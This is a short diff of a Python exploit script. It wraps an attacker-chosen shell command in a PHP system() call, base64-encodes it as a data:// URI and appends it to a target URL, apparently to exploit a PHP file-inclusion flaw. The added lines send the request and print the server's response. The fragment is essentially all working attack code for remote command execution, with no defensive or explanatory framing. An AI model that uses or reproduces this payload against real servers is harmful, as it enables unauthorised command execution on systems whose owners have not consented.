@@ -15,5 +15,12 @@ cod = """<?php system('%s'); ?>""" % command
 codeb64 = cod.encode('base64')
 dataw = """data://text/plain;base64,""" +str(codeb64)
 
+destiny = url + dataw
+
+r = requests.get(destiny)
+print (r.status_code)
+print (r.headers)
+print (r.content)
+
 
 
